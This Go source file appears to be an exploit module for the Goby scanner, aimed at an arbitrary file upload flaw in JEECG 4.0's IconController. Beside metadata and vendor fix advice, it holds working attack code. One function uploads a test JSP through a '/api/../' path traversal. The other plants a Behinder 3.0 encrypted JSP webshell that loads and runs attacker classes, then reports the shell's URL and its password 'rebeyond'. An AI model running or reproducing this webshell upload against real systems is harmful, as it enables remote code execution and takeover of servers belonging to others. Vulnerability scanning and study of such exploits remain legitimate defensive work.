package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "JEECG 4.0 IconController Arbitrary File Upload",
    "Description": "<p>JEECG is a J2EE rapid development platform based on code generator.</p><p>There is an arbitrary file upload vulnerability in the IconController file of the JEECG development system version 4.0. Attackers can upload malicious Trojan horses to control server permissions.</p>",
    "Impact": "JEECG 4.0 IconController Arbitrary File Upload",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://gitee.com/jeecg/jeecg\">https://gitee.com/jeecg/jeecg</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "JEECG",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "JEECG 管理系统 4.0版本 IconController 任意文件上传漏洞",
            "Description": "<p>JEECG是一款基于代码生成器的J2EE快速开发平台。</p><p>JEECG开发系统4.0版本IconController文件存在任意文件上传漏洞，攻击者可上传恶意木马控制服务器权限。</p>",
            "Impact": "<p>JEECG开发系统4.0版本IconController文件存在任意文件上传漏洞，攻击者可上传恶意木马控制服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://gitee.com/jeecg/jeecg\">https://gitee.com/jeecg/jeecg</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "JEECG",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "JEECG 4.0 IconController Arbitrary File Upload",
            "Description": "<p>JEECG is a J2EE rapid development platform based on code generator.</p><p>There is an arbitrary file upload vulnerability in the IconController file of the JEECG development system version 4.0. Attackers can upload malicious Trojan horses to control server permissions.</p>",
            "Impact": "JEECG 4.0 IconController Arbitrary File Upload",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://gitee.com/jeecg/jeecg\">https://gitee.com/jeecg/jeecg</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "JEECG",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "FofaQuery": "body=\"JEECG\"",
    "GobyQuery": "body=\"JEECG\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://gitee.com/jeecg/jeecg",
    "DisclosureDate": "2021-12-01",
    "References": [
        "https://forum.butian.net/share/987"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "Behinder3.0",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10247"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/api/../iconController.do?saveOrUpdateIcon"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryW0vdr4bjEUTVj3Sw")
			cfg1.Data = "------WebKitFormBoundaryW0vdr4bjEUTVj3Sw\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\n123.jsp\r\n------WebKitFormBoundaryW0vdr4bjEUTVj3Sw\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n\r\n------WebKitFormBoundaryW0vdr4bjEUTVj3Sw\r\nContent-Disposition: form-data; name=\"iconName\"\r\n\r\ndd\r\n------WebKitFormBoundaryW0vdr4bjEUTVj3Sw\r\nContent-Disposition: form-data; name=\"iconType\"\r\n\r\n1\r\n------WebKitFormBoundaryW0vdr4bjEUTVj3Sw\r\nContent-Disposition: form-data; name=\"file\"; filename=\"123.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<%out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer(\"ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=\")));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n------WebKitFormBoundaryW0vdr4bjEUTVj3Sw--"
			if resp, err := httpclient.DoHttpRequest(u, cfg1); err == nil && resp.StatusCode == 200 {
				uri2 := "/plug-in/accordion/images/123.jsp"
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "e165421110ba03099a1c0393373c5b43")
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ss.Params["AttackType"].(string) == "Behinder3.0" {
				RandName := goutils.RandomHexString(4)
				uri1 := "/api/../iconController.do?saveOrUpdateIcon"
				cfg1 := httpclient.NewPostRequestConfig(uri1)
				cfg1.VerifyTls = false
				cfg1.FollowRedirect = false
				cfg1.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryW0vdr4bjEUTVj3Sw")
				cfg1.Data = fmt.Sprintf("------WebKitFormBoundaryW0vdr4bjEUTVj3Sw\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\n%s.jsp\r\n------WebKitFormBoundaryW0vdr4bjEUTVj3Sw\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n\r\n------WebKitFormBoundaryW0vdr4bjEUTVj3Sw\r\nContent-Disposition: form-data; name=\"iconName\"\r\n\r\ndd\r\n------WebKitFormBoundaryW0vdr4bjEUTVj3Sw\r\nContent-Disposition: form-data; name=\"iconType\"\r\n\r\n1\r\n------WebKitFormBoundaryW0vdr4bjEUTVj3Sw\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<%%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%%><%%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%%><%%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%%>\r\n------WebKitFormBoundaryW0vdr4bjEUTVj3Sw--", RandName, RandName)
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil && resp.StatusCode == 200 {
					expResult.Output = "Webshell: " + expResult.HostInfo.FixedHostInfo + "/plug-in/accordion/images/" + RandName + ".jsp\n"
					expResult.Output += "Password：rebeyond\n"
					expResult.Output += "Webshell tool: Behinder v3.0"
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
